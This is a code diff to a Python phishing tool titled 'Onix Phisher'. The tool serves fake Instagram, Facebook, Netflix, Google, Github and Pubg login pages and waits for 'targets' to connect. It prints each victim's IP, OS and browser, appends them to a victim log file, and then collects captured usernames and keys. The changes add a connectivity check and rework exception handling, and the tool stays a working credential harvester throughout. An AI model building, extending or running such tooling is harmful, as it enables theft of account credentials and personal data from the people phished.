@@ -5,6 +5,7 @@ import sys
 import os
 import linecache
 import random
+import requests
 try:
     import win32gui, win32con
     from colorama import Fore , init; init()
@@ -21,6 +22,20 @@ except ImportError or ModuleNotFoundError:
 
 #Change Title====================================================================================================
 os.system("title Onix Phisher")
+
+#Check Connection====================================================================================================
+try:
+    connection = requests.get("https://soft98.ir")
+    connection1 = requests.get("https://www.digikala.com")
+
+    if connection.status_code == 200 or connection1.status_code == 200:
+        pass
+    
+    else:
+        exit(Fore.RED + "You dont have internet connection please check your connection and come back soon !!" + Fore.RESET)
+except Exception:
+    exit(Fore.RED + "You dont have internet connection please check your connection and come back !!" + Fore.RESET)
+
 #build localhost====================================================================================================
 def php_server():
     with open("server" , "w") as log:
@@ -57,7 +72,7 @@ else:
     pass
 
 #Banner ====================================================================================================
-Banner_color = Fore.RED , Fore.MAGENTA , Fore.BLUE , Fore.GREEN
+Banner_color = (Fore.RED , Fore.MAGENTA , Fore.BLUE , Fore.GREEN)
 
 
 print(fr"""{random.choice(Banner_color)}
@@ -93,7 +108,7 @@ print(f"""
 
 try:
     ask = input(Fore.MAGENTA + "which option you want: ".title() + Fore.RESET)
-    voices = ["good_idea.mp3" , "im_with_you.mp3" , "nice_choose.mp3" , "you_own.mp3"]
+    voices = ("good_idea.mp3" , "im_with_you.mp3" , "nice_choose.mp3" , "you_own.mp3")
     voice_path = os.getcwd()
     os.chdir(fr"{voice_path}\Voice")
     playsound(random.choice(voices))
@@ -137,41 +152,41 @@ def instagram():
     Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
-
-    while True:
-        size = os.stat("info.json")
-        if size.st_size != 0:
-            
-            #play sound
-            os.chdir(r"..\Voice")
-            playsound("T_connected.mp3")
-            sleep(0.5)
-            os.chdir(fr"{path}\instagram")
-            sleep(0.5)
-
-            with open("info.json", "r") as read_file:
-                data = json.load(read_file)
-
-                print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
-                print("\nOs Name :" , data["dev"][0]["Os-Name"])
-                print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+    try:
+        while True:
+            size = os.stat("info.json")
+            if size.st_size != 0:
                 
-                sleep(1)
-                df = pd.read_json(r"info.json")
-                sleep(1)
-                df.to_csv("Victim_info.txt", index=False , mode="a")
+                #play sound
+                os.chdir(r"..\Voice")
+                playsound("T_connected.mp3")
+                sleep(0.5)
+                os.chdir(fr"{path}\instagram")
+                sleep(0.5)
 
-                victim_file= open("victim_info.txt", "a")
-                victim_file.write("\n")
-                sleep(3)
-                open("info.json" , "w").close()
-                victim_file.close()
+                with open("info.json", "r") as read_file:
+                    data = json.load(read_file)
 
-                try:
+                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
+                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
+                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                    
+                    sleep(1)
+                    df = pd.read_json(r"info.json")
+                    sleep(1)
+                    df.to_csv("Victim_info.txt", index=False , mode="a")
+
+                    victim_file= open("victim_info.txt", "a")
+                    victim_file.write("\n")
+                    sleep(3)
+                    open("info.json" , "w").close()
+                    victim_file.close()
+
                     Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
-                except KeyboardInterrupt:
-                    exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
-                break
+                    break
+
+    except KeyboardInterrupt:
+        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
 
 #====================================================================================================
     while True:
@@ -248,39 +263,41 @@ def facebook():
     Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
-    while True:
-        size = os.stat("info.json")
-        if size.st_size != 0:
+    try:
+        while True:
+            size = os.stat("info.json")
+            if size.st_size != 0:
 
-            #play sound
-            os.chdir(r"..\Voice")
-            playsound("T_connected.mp3")
-            sleep(0.5)
-            os.chdir(fr"{path}\facebook")
-            sleep(0.5)
+                #play sound
+                os.chdir(r"..\Voice")
+                playsound("T_connected.mp3")
+                sleep(0.5)
+                os.chdir(fr"{path}\facebook")
+                sleep(0.5)
 
 
-            with open("info.json", "r") as read_file:
-                data = json.load(read_file)
+                with open("info.json", "r") as read_file:
+                    data = json.load(read_file)
 
-                print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
-                print("\nOs Name :" , data["dev"][0]["Os-Name"])
-                print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
-                
-                df = pd.read_json(r"info.json")
-                df.to_csv("Victim_info.txt", index=False , mode="a")
+                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
+                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
+                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                    
+                    df = pd.read_json(r"info.json")
+                    df.to_csv("Victim_info.txt", index=False , mode="a")
 
-                victim_file= open("victim_info.txt", "a")
-                victim_file.write("\n")
-                sleep(3)
-                open("info.json" , "w").close()
-                victim_file.close()
+                    victim_file= open("victim_info.txt", "a")
+                    victim_file.write("\n")
+                    sleep(3)
+                    open("info.json" , "w").close()
+                    victim_file.close()
 
-                try:
                     Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
-                except KeyboardInterrupt:
-                    exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
-                break
+                    
+                    break
+
+    except KeyboardInterrupt:
+        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
 
 #====================================================================================================
     while True:
@@ -358,39 +375,42 @@ def netflix():
     Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
-    while True:
-        size = os.stat("info.json")
-        if size.st_size != 0:
+    try:
+        while True:
+            size = os.stat("info.json")
+            if size.st_size != 0:
 
-            #play sound
-            os.chdir(r"..\Voice")
-            playsound("T_connected.mp3")
-            sleep(0.5)
-            os.chdir(fr"{path}\Netflix")
-            sleep(0.5)
+                #play sound
+                os.chdir(r"..\Voice")
+                playsound("T_connected.mp3")
+                sleep(0.5)
+                os.chdir(fr"{path}\Netflix")
+                sleep(0.5)
 
 
-            with open("info.json", "r") as read_file:
-                data = json.load(read_file)
+                with open("info.json", "r") as read_file:
+                    data = json.load(read_file)
 
-                print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
-                print("\nOs Name :" , data["dev"][0]["Os-Name"])
-                print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
-                
-                df = pd.read_json(r"info.json")
-                df.to_csv("Victim_info.txt", index=False , mode="a")
+                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
+                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
+                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                    
+                    df = pd.read_json(r"info.json")
+                    df.to_csv("Victim_info.txt", index=False , mode="a")
 
-                victim_file= open("victim_info.txt", "a")
-                victim_file.write("\n")
-                sleep(3)
-                open("info.json" , "w").close()
-                victim_file.close()
+                    victim_file= open("victim_info.txt", "a")
+                    victim_file.write("\n")
+                    sleep(3)
+                    open("info.json" , "w").close()
+                    victim_file.close()
 
-                try:
-                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
-                except KeyboardInterrupt:
-                    exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
-                break
+                    try:
+                        Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
+                    except KeyboardInterrupt:
+                        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
+                    break
+    except KeyboardInterrupt:
+        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
 
 #====================================================================================================
     while True:
@@ -468,39 +488,40 @@ def Google():
     Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
-    while True:
-        size = os.stat("info.json")
-        if size.st_size != 0:
+    try:
+        while True:
+            size = os.stat("info.json")
+            if size.st_size != 0:
 
-            #play sound
-            os.chdir(r"..\Voice")
-            playsound("T_connected.mp3")
-            sleep(0.5)
-            os.chdir(fr"{path}\Google")
-            sleep(0.5)
+                #play sound
+                os.chdir(r"..\Voice")
+                playsound("T_connected.mp3")
+                sleep(0.5)
+                os.chdir(fr"{path}\Google")
+                sleep(0.5)
 
 
-            with open("info.json", "r") as read_file:
-                data = json.load(read_file)
+                with open("info.json", "r") as read_file:
+                    data = json.load(read_file)
 
-                print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
-                print("\nOs Name :" , data["dev"][0]["Os-Name"])
-                print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
+                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
+                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                    
+                    df = pd.read_json(r"info.json")
+                    df.to_csv("Victim_info.txt", index=False , mode="a")
+
+                    victim_file= open("victim_info.txt", "a")
+                    victim_file.write("\n")
+                    sleep(3)
+                    open("info.json" , "w").close()
+                    victim_file.close()
+                    
                 
-                df = pd.read_json(r"info.json")
-                df.to_csv("Victim_info.txt", index=False , mode="a")
-
-                victim_file= open("victim_info.txt", "a")
-                victim_file.write("\n")
-                sleep(3)
-                open("info.json" , "w").close()
-                victim_file.close()
-                
-                try:
                     Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
-                except KeyboardInterrupt:
-                    exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
-                break
+                    
+    except KeyboardInterrupt:
+        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
 
 
 #====================================================================================================
@@ -579,41 +600,43 @@ def Github():
     Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
-    while True:
-        size = os.stat("info.json")
-        if size.st_size != 0:
+    try:
+        while True:
+            size = os.stat("info.json")
+            if size.st_size != 0:
 
-            #play sound
-            os.chdir(r"..\Voice")
-            playsound("T_connected.mp3")
-            sleep(0.5)
-            os.chdir(fr"{path}\Github")
-            sleep(0.5)
+                #play sound
+                os.chdir(r"..\Voice")
+                playsound("T_connected.mp3")
+                sleep(0.5)
+                os.chdir(fr"{path}\Github")
+                sleep(0.5)
 
 
-            with open("info.json", "r") as read_file:
-                data = json.load(read_file)
+                with open("info.json", "r") as read_file:
+                    data = json.load(read_file)
 
-                print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
-                print("\nOs Name :" , data["dev"][0]["Os-Name"])
-                print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
-                
-                sleep(1)
-                df = pd.read_json(r"info.json")
-                sleep(1)
-                df.to_csv("Victim_info.txt", index=False , mode="a")
+                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
+                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
+                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                    
+                    sleep(1)
+                    df = pd.read_json(r"info.json")
+                    sleep(1)
+                    df.to_csv("Victim_info.txt", index=False , mode="a")
 
-                victim_file= open("victim_info.txt", "a")
-                victim_file.write("\n")
-                sleep(3)
-                open("info.json" , "w").close()
-                victim_file.close()
+                    victim_file= open("victim_info.txt", "a")
+                    victim_file.write("\n")
+                    sleep(3)
+                    open("info.json" , "w").close()
+                    victim_file.close()
 
-                try:
                     Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
-                except KeyboardInterrupt:
-                    exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
-                break
+                    
+                    break
+
+    except KeyboardInterrupt:
+        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
 
 #====================================================================================================
     while True:
@@ -690,42 +713,45 @@ def Pubg():
     Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
         
 #Write info====================================================================================================
-    while True:
-        size = os.stat("info.json")
-        if size.st_size != 0:
+    try:
+        while True:
+            size = os.stat("info.json")
+            if size.st_size != 0:
 
-            #play sound
-            os.chdir(r"..\Voice")
-            playsound("T_connected.mp3")
-            sleep(0.5)
-            os.chdir(fr"{path}\Pubg")
-            sleep(0.5)
+                #play sound
+                os.chdir(r"..\Voice")
+                playsound("T_connected.mp3")
+                sleep(0.5)
+                os.chdir(fr"{path}\Pubg")
+                sleep(0.5)
 
 
-            with open("info.json", "r") as read_file:
-                data = json.load(read_file)
+                with open("info.json", "r") as read_file:
+                    data = json.load(read_file)
 
-                print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
-                print("\nOs Name :" , data["dev"][0]["Os-Name"])
-                print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
+                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
+                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                    
+                    sleep(1)
+                    df = pd.read_json(r"info.json")
+                    sleep(1)
+                    df.to_csv("Victim_info.txt", index=False , mode="a")
+
+                    victim_file= open("victim_info.txt", "a")
+                    victim_file.write("\n")
+                    sleep(3)
+                    open("info.json" , "w").close()
+                    victim_file.close()
+
                 
-                sleep(1)
-                df = pd.read_json(r"info.json")
-                sleep(1)
-                df.to_csv("Victim_info.txt", index=False , mode="a")
-
-                victim_file= open("victim_info.txt", "a")
-                victim_file.write("\n")
-                sleep(3)
-                open("info.json" , "w").close()
-                victim_file.close()
-
-                try:
                     Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
-                except KeyboardInterrupt:
-                    exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
-                break
+                    
+                    break
 
+    except KeyboardInterrupt:
+        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
+    
 #====================================================================================================
     while True:
         size = os.stat("username_key.txt")
